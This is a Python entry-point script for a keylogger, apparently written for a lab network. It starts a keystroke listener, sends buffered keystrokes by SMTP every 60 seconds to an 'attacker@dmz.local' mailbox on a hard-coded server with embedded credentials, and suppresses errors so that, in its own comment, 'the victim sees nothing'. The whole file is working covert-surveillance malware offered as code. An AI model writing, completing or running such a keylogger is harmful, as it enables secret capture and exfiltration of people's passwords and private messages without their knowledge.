from utils.logger import SMTPLogger
from core.listener import Keystrokelistener
import sys
import signal

def main():
    # --- SMTP CONFIGURATION ---
    SMTP_SERVER = "172.16.0.5"
    SMTP_PORT = 587
    SENDER_EMAIL = "attacker@dmz.local"
    SENDER_PASSWORD = "password123"
    RECEIVER_EMAIL = "attacker@dmz.local"
    BUFFER_SIZE = 100
    SEND_INTERVAL = 60
    
    try:
        # Initialize the SMTP logger
        logger = SMTPLogger(
            smtp_server=SMTP_SERVER,
            smtp_port=SMTP_PORT,
            sender_email=SENDER_EMAIL,
            sender_password=SENDER_PASSWORD,
            receiver_email=RECEIVER_EMAIL,
            buffer_size=BUFFER_SIZE,
            send_interval=SEND_INTERVAL
        )
        
        # Start the listener
        listener = Keystrokelistener(on_press_callback=logger.log_keystroke)
        
        # Signal handlers for graceful shutdown
        def signal_handler(sig, frame):
            listener.stop()
            logger.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        listener.start()
        
        # Keep the script running
        listener.join()
    except Exception:
        # Silent fail: If SMTP is down, the victim sees nothing
        sys.exit(0)

if __name__ == "__main__":
    main()
